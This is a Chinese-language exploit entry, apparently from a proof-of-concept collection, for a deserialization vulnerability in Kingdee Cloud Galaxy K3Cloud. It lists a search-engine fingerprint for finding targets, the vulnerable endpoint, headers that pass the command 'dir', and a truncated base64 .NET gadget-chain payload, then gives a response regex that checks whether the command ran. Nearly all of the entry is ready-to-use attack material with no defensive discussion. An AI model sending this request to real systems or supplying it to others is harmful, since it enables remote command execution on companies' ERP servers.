# 金蝶星空云K3Cloud反序列化漏洞

- **系统**：金蝶　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="金蝶云星空-管理中心"`
- **请求**：`POST /k3cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DynamicForm.DynamicFormService.CloseForm.common.kdsvc HTTP/1.1`
- **关键头**：`Content-Type: text/json`　`xxxxx: dir`

**请求体 / payload**
```
{"ap0": "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAA…（脚本共 15909 字，完整版见原文）
```
- **预期**：200　|　^(?=.*?windows)(?=.*?system).*?$